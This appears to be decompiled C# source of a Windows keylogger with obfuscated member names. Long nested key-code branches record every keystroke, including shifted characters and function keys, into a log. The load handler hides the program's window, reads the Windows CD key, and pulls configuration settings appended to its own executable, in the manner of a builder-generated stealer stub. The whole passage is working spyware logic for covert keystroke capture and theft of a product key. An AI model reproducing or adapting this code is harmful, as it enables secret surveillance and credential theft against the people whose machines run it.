																																					else
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + " ");
																																					}
																																				}
																																				else
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "`");
																																				}
																																			}
																																			else
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + "\\");
																																			}
																																		}
																																		else
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "/");
																																		}
																																	}
																																	else
																																	{
																																		TextBox1.set_Text(TextBox1.get_Text() + "]");
																																	}
																																}
																																else
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + "[");
																																}
																															}
																															else
																															{
																																TextBox1.set_Text(TextBox1.get_Text() + "-");
																															}
																														}
																														else
																														{
																															TextBox1.set_Text(TextBox1.get_Text() + ",");
																														}
																													}
																													else
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "z");
																													}
																												}
																												else
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "x");
																												}
																											}
																											else
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "w");
																											}
																										}
																										else
																										{
																											TextBox1.set_Text(TextBox1.get_Text() + "v");
																										}
																									}
																									else
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "u");
																									}
																								}
																								else
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "r");
																								}
																							}
																							else
																							{
																								TextBox1.set_Text(TextBox1.get_Text() + "q");
																							}
																						}
																						else
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "p");
																						}
																					}
																					else
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "o");
																					}
																				}
																				else
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "n");
																				}
																			}
																			else
																			{
																				TextBox1.set_Text(TextBox1.get_Text() + "m");
																			}
																		}
																		else
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "l");
																		}
																	}
																	else
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "g");
																	}
																}
																else
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "d");
																}
															}
															else
															{
																TextBox1.set_Text(TextBox1.get_Text() + "b");
															}
														}
														else
														{
															TextBox1.set_Text(TextBox1.get_Text() + "a");
														}
													}
													else
													{
														TextBox1.set_Text(TextBox1.get_Text() + "0");
													}
												}
												else
												{
													TextBox1.set_Text(TextBox1.get_Text() + "9");
												}
											}
											else
											{
												TextBox1.set_Text(TextBox1.get_Text() + "8");
											}
										}
										else
										{
											TextBox1.set_Text(TextBox1.get_Text() + "7");
										}
									}
									else
									{
										TextBox1.set_Text(TextBox1.get_Text() + "6");
									}
								}
								else
								{
									TextBox1.set_Text(TextBox1.get_Text() + "5");
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + "4");
							}
						}
						else
						{
							TextBox1.set_Text(TextBox1.get_Text() + "3");
						}
					}
					else
					{
						TextBox1.set_Text(TextBox1.get_Text() + "2");
					}
				}
				else
				{
					TextBox1.set_Text(TextBox1.get_Text() + "1");
				}
			}
			else
			{
				if (!(((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()))
				{
					return;
				}
				if ((int)Key != 49)
				{
					if ((int)Key != 50)
					{
						if ((int)Key != 51)
						{
							if ((int)Key != 52)
							{
								if ((int)Key == 53)
								{
									TextBox1.set_Text(TextBox1.get_Text() + "%");
								}
								else if ((int)Key != 54)
								{
									if ((int)Key == 55)
									{
										TextBox1.set_Text(TextBox1.get_Text() + "&");
									}
									else if ((int)Key != 56)
									{
										if ((int)Key != 57)
										{
											if ((int)Key != 48)
											{
												if ((int)Key != 65)
												{
													if ((int)Key != 66)
													{
														if ((int)Key != 67)
														{
															if ((int)Key == 68)
															{
																TextBox1.set_Text(TextBox1.get_Text() + "D");
															}
															else if ((int)Key != 69)
															{
																if ((int)Key == 70)
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "F");
																}
																else if ((int)Key == 71)
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "G");
																}
																else if ((int)Key != 72)
																{
																	if ((int)Key == 73)
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "I");
																	}
																	else if ((int)Key != 74)
																	{
																		if ((int)Key != 75)
																		{
																			if ((int)Key != 76)
																			{
																				if ((int)Key != 77)
																				{
																					if ((int)Key != 78)
																					{
																						if ((int)Key == 79)
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "O");
																						}
																						else if ((int)Key != 80)
																						{
																							if ((int)Key != 81)
																							{
																								if ((int)Key != 82)
																								{
																									if ((int)Key != 83)
																									{
																										if ((int)Key != 84)
																										{
																											if ((int)Key != 85)
																											{
																												if ((int)Key != 86)
																												{
																													if ((int)Key != 87)
																													{
																														if ((int)Key != 88)
																														{
																															if ((int)Key != 89)
																															{
																																if ((int)Key != 90)
																																{
																																	if ((int)Key != 188)
																																	{
																																		if ((int)Key == 189)
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "_");
																																		}
																																		else if ((int)Key == 219)
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "{");
																																		}
																																		else if ((int)Key != 221)
																																		{
																																			if ((int)Key != 191)
																																			{
																																				if ((int)Key != 220)
																																				{
																																					if ((int)Key != 186)
																																					{
																																						if ((int)Key != 190)
																																						{
																																							if ((int)Key != 192)
																																							{
																																								if ((int)Key != 32)
																																								{
																																									if ((int)Key != 13)
																																									{
																																										if ((int)Key != 112)
																																										{
																																											if ((int)Key != 113)
																																											{
																																												if ((int)Key != 114)
																																												{
																																													if ((int)Key != 115)
																																													{
																																														if ((int)Key != 116)
																																														{
																																															if ((int)Key == 117)
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<F6>");
																																															}
																																															else if ((int)Key != 118)
																																															{
																																																if ((int)Key != 119)
																																																{
																																																	if ((int)Key != 120)
																																																	{
																																																		if ((int)Key != 121)
																																																		{
																																																			if ((int)Key == 122)
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "<F11>");
																																																			}
																																																			else if ((int)Key != 123)
																																																			{
																																																				if ((int)Key == 46)
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																				}
																																																				else if ((int)Key != 8)
																																																				{
																																																					if ((int)Key == 40)
																																																					{
																																																						TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																					}
																																																					else if ((int)Key != 38)
																																																					{
																																																						if ((int)Key != 37)
																																																						{
																																																							if ((int)Key != 39)
																																																							{
																																																								if ((int)Key != 9)
																																																								{
																																																									if ((int)Key == 35)
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "<END>");
																																																									}
																																																									else if ((int)Key != 27)
																																																									{
																																																										if ((int)Key != 111)
																																																										{
																																																											if ((int)Key != 110)
																																																											{
																																																												if ((int)Key != 109)
																																																												{
																																																													if ((int)Key != 107)
																																																													{
																																																														if ((int)Key == 106)
																																																														{
																																																															TextBox1.set_Text(TextBox1.get_Text() + "*");
																																																														}
																																																													}
																																																													else
																																																													{
																																																														TextBox1.set_Text(TextBox1.get_Text() + "+");
																																																													}
																																																												}
																																																												else
																																																												{
																																																													TextBox1.set_Text(TextBox1.get_Text() + "-");
																																																												}
																																																											}
																																																											else
																																																											{
																																																												TextBox1.set_Text(TextBox1.get_Text() + ".");
																																																											}
																																																										}
																																																										else
																																																										{
																																																											TextBox1.set_Text(TextBox1.get_Text() + "/");
																																																										}
																																																									}
																																																									else
																																																									{
																																																										TextBox1.set_Text(TextBox1.get_Text() + "<ESC>");
																																																									}
																																																								}
																																																								else
																																																								{
																																																									TextBox1.set_Text(TextBox1.get_Text() + "<TAB>");
																																																								}
																																																							}
																																																							else
																																																							{
																																																								TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																							}
																																																						}
																																																						else
																																																						{
																																																							TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																						}
																																																					}
																																																					else
																																																					{
																																																						TextBox1.set_Text(TextBox1.get_Text() + "?");
																																																					}
																																																				}
																																																				else
																																																				{
																																																					TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																																				}
																																																			}
																																																			else
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "<F12>");
																																																			}
																																																		}
																																																		else
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "<F10>");
																																																		}
																																																	}
																																																	else
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "<F9>");
																																																	}
																																																}
																																																else
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<F8>");
																																																}
																																															}
																																															else
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<F7>");
																																															}
																																														}
																																														else
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<F5>");
																																														}
																																													}
																																													else
																																													{
																																														TextBox1.set_Text(TextBox1.get_Text() + "<F4>");
																																													}
																																												}
																																												else
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "<F3>");
																																												}
																																											}
																																											else
																																											{
																																												TextBox1.set_Text(TextBox1.get_Text() + "<F2>");
																																											}
																																										}
																																										else
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "<F1>");
																																										}
																																									}
																																									else
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
																																									}
																																								}
																																								else
																																								{
																																									TextBox1.set_Text(TextBox1.get_Text() + " ");
																																								}
																																							}
																																							else
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "~");
																																							}
																																						}
																																						else
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + ">");
																																						}
																																					}
																																					else
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + ":");
																																					}
																																				}
																																				else
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "|");
																																				}
																																			}
																																			else
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + "?");
																																			}
																																		}
																																		else
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "}");
																																		}
																																	}
																																	else
																																	{
																																		TextBox1.set_Text(TextBox1.get_Text() + "<");
																																	}
																																}
																																else
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + "Z");
																																}
																															}
																															else
																															{
																																TextBox1.set_Text(TextBox1.get_Text() + "Y");
																															}
																														}
																														else
																														{
																															TextBox1.set_Text(TextBox1.get_Text() + "X");
																														}
																													}
																													else
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "W");
																													}
																												}
																												else
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "V");
																												}
																											}
																											else
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "U");
																											}
																										}
																										else
																										{
																											TextBox1.set_Text(TextBox1.get_Text() + "T");
																										}
																									}
																									else
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "S");
																									}
																								}
																								else
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "R");
																								}
																							}
																							else
																							{
																								TextBox1.set_Text(TextBox1.get_Text() + "Q");
																							}
																						}
																						else
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "P");
																						}
																					}
																					else
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "N");
																					}
																				}
																				else
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "M");
																				}
																			}
																			else
																			{
																				TextBox1.set_Text(TextBox1.get_Text() + "L");
																			}
																		}
																		else
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "K");
																		}
																	}
																	else
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "J");
																	}
																}
																else
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "H");
																}
															}
															else
															{
																TextBox1.set_Text(TextBox1.get_Text() + "E");
															}
														}
														else
														{
															TextBox1.set_Text(TextBox1.get_Text() + "C");
														}
													}
													else
													{
														TextBox1.set_Text(TextBox1.get_Text() + "B");
													}
												}
												else
												{
													TextBox1.set_Text(TextBox1.get_Text() + "A");
												}
											}
											else
											{
												TextBox1.set_Text(TextBox1.get_Text() + ")");
											}
										}
										else
										{
											TextBox1.set_Text(TextBox1.get_Text() + "(");
										}
									}
									else
									{
										TextBox1.set_Text(TextBox1.get_Text() + "*");
									}
								}
								else
								{
									TextBox1.set_Text(TextBox1.get_Text() + "^");
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + "$");
							}
						}
						else
						{
							TextBox1.set_Text(TextBox1.get_Text() + "#");
						}
					}
					else
					{
						TextBox1.set_Text(TextBox1.get_Text() + "@");
					}
				}
				else
				{
					TextBox1.set_Text(TextBox1.get_Text() + "!");
				}
			}
		}
		else if ((int)Key != 49)
		{
			if ((int)Key != 50)
			{
				if ((int)Key != 51)
				{
					if ((int)Key != 52)
					{
						if ((int)Key == 53)
						{
							TextBox1.set_Text(TextBox1.get_Text() + "%");
						}
						else if ((int)Key != 54)
						{
							if ((int)Key != 55)
							{
								if ((int)Key != 56)
								{
									if ((int)Key != 57)
									{
										if ((int)Key == 48)
										{
											TextBox1.set_Text(TextBox1.get_Text() + ")");
										}
										else if ((int)Key == 65)
										{
											TextBox1.set_Text(TextBox1.get_Text() + "A");
										}
										else if ((int)Key == 66)
										{
											TextBox1.set_Text(TextBox1.get_Text() + "B");
										}
										else if ((int)Key == 67)
										{
											TextBox1.set_Text(TextBox1.get_Text() + "C");
										}
										else if ((int)Key == 68)
										{
											TextBox1.set_Text(TextBox1.get_Text() + "D");
										}
										else if ((int)Key != 69)
										{
											if ((int)Key != 70)
											{
												if ((int)Key == 71)
												{
													TextBox1.set_Text(TextBox1.get_Text() + "G");
												}
												else if ((int)Key == 72)
												{
													TextBox1.set_Text(TextBox1.get_Text() + "H");
												}
												else if ((int)Key != 73)
												{
													if ((int)Key != 74)
													{
														if ((int)Key == 75)
														{
															TextBox1.set_Text(TextBox1.get_Text() + "K");
														}
														else if ((int)Key != 76)
														{
															if ((int)Key == 77)
															{
																TextBox1.set_Text(TextBox1.get_Text() + "M");
															}
															else if ((int)Key != 78)
															{
																if ((int)Key != 79)
																{
																	if ((int)Key != 80)
																	{
																		if ((int)Key != 81)
																		{
																			if ((int)Key != 82)
																			{
																				if ((int)Key == 83)
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "S");
																				}
																				else if ((int)Key != 84)
																				{
																					if ((int)Key != 85)
																					{
																						if ((int)Key != 86)
																						{
																							if ((int)Key != 87)
																							{
																								if ((int)Key == 88)
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "X");
																								}
																								else if ((int)Key != 89)
																								{
																									if ((int)Key != 90)
																									{
																										if ((int)Key != 188)
																										{
																											if ((int)Key != 189)
																											{
																												if ((int)Key != 219)
																												{
																													if ((int)Key != 221)
																													{
																														if ((int)Key != 191)
																														{
																															if ((int)Key != 220)
																															{
																																if ((int)Key != 186)
																																{
																																	if ((int)Key != 190)
																																	{
																																		if ((int)Key == 192)
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + "~");
																																		}
																																		else if ((int)Key != 32)
																																		{
																																			if ((int)Key != 13)
																																			{
																																				if ((int)Key == 112)
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "<F1>");
																																				}
																																				else if ((int)Key == 113)
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "<F2>");
																																				}
																																				else if ((int)Key != 114)
																																				{
																																					if ((int)Key == 115)
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + "<F4>");
																																					}
																																					else if ((int)Key != 116)
																																					{
																																						if ((int)Key == 117)
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + "<F6>");
																																						}
																																						else if ((int)Key != 118)
																																						{
																																							if ((int)Key == 119)
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "<F8>");
																																							}
																																							else if ((int)Key == 120)
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "<F9>");
																																							}
																																							else if ((int)Key != 121)
																																							{
																																								if ((int)Key != 122)
																																								{
																																									if ((int)Key == 123)
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "<F12>");
																																									}
																																									else if ((int)Key != 46)
																																									{
																																										if ((int)Key != 8)
																																										{
																																											if ((int)Key != 40)
																																											{
																																												if ((int)Key == 38)
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "?");
																																												}
																																												else if ((int)Key != 37)
																																												{
																																													if ((int)Key != 39)
																																													{
																																														if ((int)Key != 9)
																																														{
																																															if ((int)Key != 35)
																																															{
																																																if ((int)Key != 27)
																																																{
																																																	if ((int)Key == 111)
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + "/");
																																																	}
																																																	else if ((int)Key != 110)
																																																	{
																																																		if ((int)Key == 109)
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "-");
																																																		}
																																																		else if ((int)Key != 107)
																																																		{
																																																			if ((int)Key == 106)
																																																			{
																																																				TextBox1.set_Text(TextBox1.get_Text() + "*");
																																																			}
																																																		}
																																																		else
																																																		{
																																																			TextBox1.set_Text(TextBox1.get_Text() + "+");
																																																		}
																																																	}
																																																	else
																																																	{
																																																		TextBox1.set_Text(TextBox1.get_Text() + ".");
																																																	}
																																																}
																																																else
																																																{
																																																	TextBox1.set_Text(TextBox1.get_Text() + "<ESC>");
																																																}
																																															}
																																															else
																																															{
																																																TextBox1.set_Text(TextBox1.get_Text() + "<END>");
																																															}
																																														}
																																														else
																																														{
																																															TextBox1.set_Text(TextBox1.get_Text() + "<TAB>");
																																														}
																																													}
																																													else
																																													{
																																														TextBox1.set_Text(TextBox1.get_Text() + "?");
																																													}
																																												}
																																												else
																																												{
																																													TextBox1.set_Text(TextBox1.get_Text() + "?");
																																												}
																																											}
																																											else
																																											{
																																												TextBox1.set_Text(TextBox1.get_Text() + "?");
																																											}
																																										}
																																										else
																																										{
																																											TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																										}
																																									}
																																									else
																																									{
																																										TextBox1.set_Text(TextBox1.get_Text() + "<DEL>");
																																									}
																																								}
																																								else
																																								{
																																									TextBox1.set_Text(TextBox1.get_Text() + "<F11>");
																																								}
																																							}
																																							else
																																							{
																																								TextBox1.set_Text(TextBox1.get_Text() + "<F10>");
																																							}
																																						}
																																						else
																																						{
																																							TextBox1.set_Text(TextBox1.get_Text() + "<F7>");
																																						}
																																					}
																																					else
																																					{
																																						TextBox1.set_Text(TextBox1.get_Text() + "<F5>");
																																					}
																																				}
																																				else
																																				{
																																					TextBox1.set_Text(TextBox1.get_Text() + "<F3>");
																																				}
																																			}
																																			else
																																			{
																																				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
																																			}
																																		}
																																		else
																																		{
																																			TextBox1.set_Text(TextBox1.get_Text() + " ");
																																		}
																																	}
																																	else
																																	{
																																		TextBox1.set_Text(TextBox1.get_Text() + ">");
																																	}
																																}
																																else
																																{
																																	TextBox1.set_Text(TextBox1.get_Text() + ":");
																																}
																															}
																															else
																															{
																																TextBox1.set_Text(TextBox1.get_Text() + "|");
																															}
																														}
																														else
																														{
																															TextBox1.set_Text(TextBox1.get_Text() + "?");
																														}
																													}
																													else
																													{
																														TextBox1.set_Text(TextBox1.get_Text() + "}");
																													}
																												}
																												else
																												{
																													TextBox1.set_Text(TextBox1.get_Text() + "{");
																												}
																											}
																											else
																											{
																												TextBox1.set_Text(TextBox1.get_Text() + "_");
																											}
																										}
																										else
																										{
																											TextBox1.set_Text(TextBox1.get_Text() + "<");
																										}
																									}
																									else
																									{
																										TextBox1.set_Text(TextBox1.get_Text() + "Z");
																									}
																								}
																								else
																								{
																									TextBox1.set_Text(TextBox1.get_Text() + "Y");
																								}
																							}
																							else
																							{
																								TextBox1.set_Text(TextBox1.get_Text() + "W");
																							}
																						}
																						else
																						{
																							TextBox1.set_Text(TextBox1.get_Text() + "V");
																						}
																					}
																					else
																					{
																						TextBox1.set_Text(TextBox1.get_Text() + "U");
																					}
																				}
																				else
																				{
																					TextBox1.set_Text(TextBox1.get_Text() + "T");
																				}
																			}
																			else
																			{
																				TextBox1.set_Text(TextBox1.get_Text() + "R");
																			}
																		}
																		else
																		{
																			TextBox1.set_Text(TextBox1.get_Text() + "Q");
																		}
																	}
																	else
																	{
																		TextBox1.set_Text(TextBox1.get_Text() + "P");
																	}
																}
																else
																{
																	TextBox1.set_Text(TextBox1.get_Text() + "O");
																}
															}
															else
															{
																TextBox1.set_Text(TextBox1.get_Text() + "N");
															}
														}
														else
														{
															TextBox1.set_Text(TextBox1.get_Text() + "L");
														}
													}
													else
													{
														TextBox1.set_Text(TextBox1.get_Text() + "J");
													}
												}
												else
												{
													TextBox1.set_Text(TextBox1.get_Text() + "I");
												}
											}
											else
											{
												TextBox1.set_Text(TextBox1.get_Text() + "F");
											}
										}
										else
										{
											TextBox1.set_Text(TextBox1.get_Text() + "E");
										}
									}
									else
									{
										TextBox1.set_Text(TextBox1.get_Text() + "(");
									}
								}
								else
								{
									TextBox1.set_Text(TextBox1.get_Text() + "*");
								}
							}
							else
							{
								TextBox1.set_Text(TextBox1.get_Text() + "&");
							}
						}
						else
						{
							TextBox1.set_Text(TextBox1.get_Text() + "^");
						}
					}
					else
					{
						TextBox1.set_Text(TextBox1.get_Text() + "$");
					}
				}
				else
				{
					TextBox1.set_Text(TextBox1.get_Text() + "#");
				}
			}
			else
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
		}
		else
		{
			TextBox1.set_Text(TextBox1.get_Text() + "!");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0001_dispatch)
					{
					default:
						num = 1;
						TextBox6.set_Text("==================================================" + nl + "Windows CD Key : " + TNLgi4bBsY() + nl + "==================================================");
						goto IL_004e;
					case 1993:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0001;
								case 1:
									break;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_004e;
							case 3:
								goto IL_005b;
							case 4:
								goto IL_0064;
							case 5:
								goto IL_0076;
							case 6:
								goto IL_008a;
							case 7:
								goto IL_009e;
							case 8:
								goto IL_00b2;
							case 9:
								goto IL_00c6;
							case 10:
								goto IL_00db;
							case 11:
								goto IL_00f0;
							case 12:
								goto IL_0105;
							case 13:
								goto IL_011a;
							case 14:
								goto IL_012f;
							case 15:
								goto IL_0144;
							case 16:
								goto IL_0159;
							case 17:
								goto IL_016e;
							case 18:
								goto IL_0183;
							case 19:
								goto IL_0198;
							case 20:
								goto IL_01ad;
							case 21:
								goto IL_01c6;
							case 22:
								goto IL_01df;
							case 23:
								goto IL_01f8;
							case 24:
								goto IL_0211;
							case 25:
								goto IL_022a;
							case 26:
								goto IL_0243;
							case 27:
								goto IL_025c;
							case 28:
								goto IL_0275;
							case 29:
								goto IL_028e;
							case 30:
								goto IL_02a7;
							case 31:
								goto IL_02c0;
							case 32:
								goto IL_02d9;
							case 33:
								goto IL_02f2;
							case 34:
								goto IL_030b;
							case 35:
								goto IL_0324;
							case 36:
								goto IL_033b;
							case 37:
								goto IL_0356;
							case 38:
								goto IL_036c;
							case 39:
								goto IL_0382;
							case 40:
								goto IL_0398;
							case 41:
								goto IL_03af;
							case 43:
								goto IL_03c4;
							case 44:
								goto IL_03c7;
							case 42:
							case 45:
							case 46:
								goto IL_03d5;
							case 48:
								goto IL_03ea;
							case 49:
								goto IL_03ed;
							case 47:
							case 50:
							case 51:
								goto IL_0400;
							case 53:
								goto IL_0415;
							case 54:
								goto IL_0418;
							case 52:
							case 55:
							case 56:
								goto IL_0426;
							case 58:
								goto IL_043b;
							case 59:
								goto IL_043e;
							case 57:
							case 60:
							case 61:
								goto IL_0448;
							case 63:
								goto IL_045d;
							case 64:
								goto IL_0460;
							case 62:
							case 65:
							case 66:
								goto IL_0469;
							case 68:
								goto IL_047f;
							case 69:
								goto IL_0482;
							case 67:
							case 70:
							case 71:
								goto IL_048b;
							case 73:
								goto IL_04a1;
							case 74:
								goto IL_04a4;
							case 72:
							case 75:
							case 76:
								goto IL_04ad;
							case 78:
								goto IL_04c3;
							case 79:
								goto IL_04c6;
							case 80:
								goto IL_04cf;
							case 77:
							case 81:
							case 82:
								goto IL_04d8;
							case 84:
								goto IL_04ee;
							case 85:
								goto IL_04f1;
							case 83:
							case 86:
							case 87:
								goto IL_04ff;
							case 89:
								goto IL_0515;
							case 90:
								goto IL_0518;
							case 91:
								goto IL_0520;
							case 92:
								goto IL_052b;
							case 93:
								goto IL_0533;
							case 94:
								goto IL_053d;
							case 95:
								goto IL_0545;
							case 88:
							case 96:
							case 97:
								goto IL_054f;
							case 99:
								goto IL_0565;
							case 100:
								goto IL_0568;
							case 98:
							case 101:
							case 102:
								goto IL_0576;
							case 104:
								goto IL_058c;
							case 105:
								goto IL_058f;
							case 103:
							case 106:
							case 107:
								goto IL_059d;
							case 108:
								goto IL_05bd;
							case 109:
								goto end_IL_0001_2;
							default:
								goto end_IL_0001;
							case 0:
								goto end_IL_0001;
							case 110:
								goto end_IL_0001_3;
							}
							goto default;
						}
						IL_05bd:
						num = 108;
						Timer1.set_Interval(Conversions.ToInteger(TextBox4.get_Text()));
						break;
						IL_059d:
						num = 107;
						TextBox4.set_Text(Conversions.ToString(Convert.ToInt32(options[3])));
						goto IL_05bd;
						IL_004e:
						num = 2;
						Timer2.Start();
						goto IL_005b;
						IL_005b:
						num = 3;
						((Control)this).set_Visible(false);
						goto IL_0064;
						IL_0064:
						num = 4;
						FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
						goto IL_0076;
						IL_0076:
						num = 5;
						nie9zcYPUv = Strings.Space((int)FileSystem.LOF(1));
						goto IL_008a;
						IL_008a:
						num = 6;
						zNYN2apmvZ = Strings.Space((int)FileSystem.LOF(1));
						goto IL_009e;
						IL_009e:
						num = 7;
						CMoPfL3l2I = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00b2;
						IL_00b2:
						num = 8;
						b4d8hOGWIz = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00c6;
						IL_00c6:
						num = 9;
						n01ypBQrhK = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00db;
						IL_00db:
						num = 10;
						fazEqHLo8Y = Strings.Space((int)FileSystem.LOF(1));
						goto IL_00f0;
						IL_00f0:
						num = 11;
						BIYaksaUXR = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0105;
						IL_0105:
						num = 12;
						TXPYU9ol9I = Strings.Space((int)FileSystem.LOF(1));
						goto IL_011a;
						IL_011a:
						num = 13;
						Jje3WLD2TX = Strings.Space((int)FileSystem.LOF(1));
						goto IL_012f;
						IL_012f:
						num = 14;
						RK8mvhFc0D = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0144;
						IL_0144:
						num = 15;
						u1ISb2tL71 = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0159;
						IL_0159:
						num = 16;
						xUXee9fLsc = Strings.Space((int)FileSystem.LOF(1));
						goto IL_016e;
						IL_016e:
						num = 17;
						Hoce22GrYR = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0183;
						IL_0183:
						num = 18;
						FLs3dYBgcK = Strings.Space((int)FileSystem.LOF(1));
						goto IL_0198;
						IL_0198:
						num = 19;
						HReXgzZX4q = Strings.Space((int)FileSystem.LOF(1));
						goto IL_01ad;
						IL_01ad:
						num = 20;
						FileSystem.FileGet(1, ref nie9zcYPUv, -1L, false);
						goto IL_01c6;
						IL_01c6:
						num = 21;
						FileSystem.FileGet(1, ref zNYN2apmvZ, -1L, false);
						goto IL_01df;
						IL_01df:
						num = 22;
						FileSystem.FileGet(1, ref CMoPfL3l2I, -1L, false);
						goto IL_01f8;
						IL_01f8:
						num = 23;
						FileSystem.FileGet(1, ref b4d8hOGWIz, -1L, false);
						goto IL_0211;
						IL_0211:
						num = 24;
						FileSystem.FileGet(1, ref n01ypBQrhK, -1L, false);
						goto IL_022a;
						IL_022a:
						num = 25;
						FileSystem.FileGet(1, ref fazEqHLo8Y, -1L, false);
						goto IL_0243;
						IL_0243:
						num = 26;
						FileSystem.FileGet(1, ref BIYaksaUXR, -1L, false);
						goto IL_025c;
						IL_025c:
						num = 27;
						FileSystem.FileGet(1, ref TXPYU9ol9I, -1L, false);
						goto IL_0275;
						IL_0275:
						num = 28;
						FileSystem.FileGet(1, ref Jje3WLD2TX, -1L, false);
						goto IL_028e;
						IL_028e:
						num = 29;
						FileSystem.FileGet(1, ref RK8mvhFc0D, -1L, false);
						goto IL_02a7;
						IL_02a7:
						num = 30;
						FileSystem.FileGet(1, ref u1ISb2tL71, -1L, false);
						goto IL_02c0;
						IL_02c0:
						num = 31;
						FileSystem.FileGet(1, ref xUXee9fLsc, -1L, false);
						goto IL_02d9;
						IL_02d9:
						num = 32;
						FileSystem.FileGet(1, ref Hoce22GrYR, -1L, false);
						goto IL_02f2;
						IL_02f2:
						num = 33;
						FileSystem.FileGet(1, ref FLs3dYBgcK, -1L, false);
						goto IL_030b;
						IL_030b:
						num = 34;
						FileSystem.FileGet(1, ref HReXgzZX4q, -1L, false);
						goto IL_0324;
						IL_0324:
						num = 35;
						FileSystem.FileClose(new int[1] { 1 });
						goto IL_033b;
						IL_033b:
						num = 36;
						options = Strings.Split(nie9zcYPUv, "@Ghxp44YKYC@", -1, (CompareMethod)0);
						goto IL_0356;
						IL_0356:
						num = 37;
						TextBox2.set_Text(options[1]);
						goto IL_036c;
						IL_036c:
						num = 38;
						TextBox3.set_Text(options[2]);
						goto IL_0382;
						IL_0382:
						num = 39;
